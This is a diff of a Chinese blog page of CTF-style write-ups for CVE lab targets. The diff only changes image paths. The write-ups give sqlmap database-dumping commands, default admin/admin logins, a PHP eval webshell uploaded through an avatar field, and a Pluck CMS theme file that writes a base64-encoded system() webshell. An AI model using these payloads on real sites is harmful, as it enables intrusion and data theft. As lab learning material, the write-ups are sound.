@@ -227,7 +227,7 @@
 <p><em>靶标介绍：</em></p>
 <p>该CMS的welcome.php中存在SQL注入攻击。</p>
 </blockquote>
-<p>靶标写的很清楚了 就是sql注入攻击<br>随意注册一个账号 登陆后便看到了我们的目标——welcome.php<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="1.jpg" alt="1"><br>拖到sqlmap里说是参数q并不能注入 点击start跳转目录 能看到更多的传参<br>再次放到sqlmap里处理….. 显示eid可注入 挺好的</p>
+<p>靶标写的很清楚了 就是sql注入攻击<br>随意注册一个账号 登陆后便看到了我们的目标——welcome.php<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/1.jpg" alt="1"><br>拖到sqlmap里说是参数q并不能注入 点击start跳转目录 能看到更多的传参<br>再次放到sqlmap里处理….. 显示eid可注入 挺好的</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-u &quot;想注入的网址&quot; //目标地址</span><br><span class="line">--dbs //爆出所有数据库</span><br><span class="line">-D //选中数据库 配合 --tables //爆出所有数据库下的项</span><br><span class="line">-T //选中项 配合 --dump //爆出项中的数据</span><br></pre></td></tr></table></figure>
 
 <p>配合网址就能爆出数据库ctf中flag项里的具体数据——flag值 过关</p>
@@ -235,44 +235,44 @@
 <p><em>靶标介绍：</em></p>
 <p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的, 该软件的主要目的是在药房和客户之间提供一套接口，客户是该软件的主要用户。该软件有助于为药房业务创建一个综合数据库，并根据到期、产品等各种参数提供各种报告。 该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞，进而导致任意代码执行。</p>
 </blockquote>
-<p>一进主页面是全白的<br>铁定不对 先用dirb扫了一遍<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2.jpg" alt="2"><br>发现个login目录 进去跳转到了wordpress的登陆页面<br>至于登陆的账号密码已经在标题上写好了——test<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="3.jpg" alt="3"><br>登陆进去看看<br>在wp-admin处 我们利用<a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/a0e40cfd-b217-481c-8fc4-027a0a023312/">一个漏洞</a>来获取mysql 数据库中的数据</p>
+<p>一进主页面是全白的<br>铁定不对 先用dirb扫了一遍<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2.jpg" alt="2"><br>发现个login目录 进去跳转到了wordpress的登陆页面<br>至于登陆的账号密码已经在标题上写好了——test<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/3.jpg" alt="3"><br>登陆进去看看<br>在wp-admin处 我们利用<a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/a0e40cfd-b217-481c-8fc4-027a0a023312/">一个漏洞</a>来获取mysql 数据库中的数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze816q8joahfm3hcxoi.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php?action=rest-nonce //获取一段随机数</span><br><span class="line">http://eci-2ze6ki5jtumuv5ixl9hu.cloudeci1.ichunqiu.com/wp-json/wp-statistics/v2/metabox?\_wpnonce=[刚刚获取的随机数]&amp;name=words&amp;search\_engine=aaa</span><br></pre></td></tr></table></figure>
 
-<p>将输入后的内容用burpsuite抓包<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="4.jpg" alt="4"><br>然后将报文保存在一个1.txt中 然后利用sqlmap进行暴库</p>
+<p>将输入后的内容用burpsuite抓包<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/4.jpg" alt="4"><br>然后将报文保存在一个1.txt中 然后利用sqlmap进行暴库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --batch --dbs</span><br></pre></td></tr></table></figure>
 
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="5.jpg" alt="5"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/5.jpg" alt="5"></p>
 <p>然后就很自然的爆出了flag 耶</p>
 <h2 id="CVE-2022-28525"><a href="#CVE-2022-28525" class="headerlink" title="CVE-2022-28525"></a>CVE-2022-28525</h2><blockquote>
 <p><em>靶标介绍：</em></p>
 <p>ED01-CMS v20180505 存在任意文件上传漏洞</p>
 </blockquote>
 <p>进入页面 发现需要登陆 且无法正常注册用户</p>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="6.jpg" alt="6"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/6.jpg" alt="6"></p>
 <p>那就f12看看线索吧…<br>发现似乎存在admin账号 那就先admin&#x2F;admin试试 再不行抓包爆破了</p>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="7.jpg" alt="7"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/7.jpg" alt="7"></p>
 <p>然后顺利进去了 傻眼<br>管理员页面全是文章添加&#x2F;删改相关的 能上传东西的只有一个账号头像了<br>上传后门文件1.php 内容还是老样子</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($\_POST[&#x27;123&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="8.jpg" alt="8"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/8.jpg" alt="8"></p>
 <p>右键图片处copy文件网址 放进蚁剑里链接 在&#x2F;flag处获得flag 完成！</p>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="9.jpg" alt="9"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/9.jpg" alt="9"></p>
 <h2 id="CVE-2023-7105"><a href="#CVE-2023-7105" class="headerlink" title="CVE-2023-7105"></a>CVE-2023-7105</h2><blockquote>
 <p><em>靶标介绍：</em></p>
 <p>E-Commerce Website 1.0 允许通过“index_search.php”中的参数“search”进行 SQL 注入。利用这个问题可能会使攻击者有机会破坏应用程序，访问或修改数据，或者利用底层数据库中的最新漏洞。</p>
 </blockquote>
-<p>进入主页 翻到个搜索框 看来就是对应了靶标中的<code>index_search</code>功能<br>burp开着监听 随便搜点东西 监听到了搞成txt放进sqlmap<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="10.jpg" alt="10"></p>
+<p>进入主页 翻到个搜索框 看来就是对应了靶标中的<code>index_search</code>功能<br>burp开着监听 随便搜点东西 监听到了搞成txt放进sqlmap<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/10.jpg" alt="10"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r [报文txt] --dbs //爆出数据库</span><br><span class="line">sqlmap -r [报文txt] -D [数据库名] --tables //选中数据库爆出数据项</span><br><span class="line">sqlmap -r [报文txt] -D [数据库名] -T [数据项名] --dump //爆出数据项中的数据</span><br></pre></td></tr></table></figure>
 
-<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="11.jpg" alt="11"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/11.jpg" alt="11"></p>
 <p>弄到最后一步就有flag了</p>
 <h2 id="CVE-2022-26965"><a href="#CVE-2022-26965" class="headerlink" title="CVE-2022-26965"></a>CVE-2022-26965</h2><blockquote>
 <p><em>靶标介绍：</em></p>
 <p>Pluck-CMS-Pluck-4.7.16 后台RCE</p>
 </blockquote>
-<p>进入页面啥也没有 点击脚注admin<br>输入密码admin进入后台<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="12.jpg" alt="12"></p>
-<p>rce的具体地点发生在网站后台的<strong>更换主题</strong>中<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="13.jpg" alt="13"></p>
-<p>去github上搜索关键词 <code>Pluck CMS</code> 去寻找简介里有 <strong>theme</strong> 字眼的项目<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="14.jpg" alt="14"></p>
+<p>进入页面啥也没有 点击脚注admin<br>输入密码admin进入后台<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/12.jpg" alt="12"></p>
+<p>rce的具体地点发生在网站后台的<strong>更换主题</strong>中<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/13.jpg" alt="13"></p>
+<p>去github上搜索关键词 <code>Pluck CMS</code> 去寻找简介里有 <strong>theme</strong> 字眼的项目<br><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/14.jpg" alt="14"></p>
 <p>进去之后在release页面下载 解压内容之后更改<code>info.php</code>文件内的具体代码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">file\_put\_contents(&#x27;testshell.php&#x27;,base64\_decode(&#x27;PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg==&#x27;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
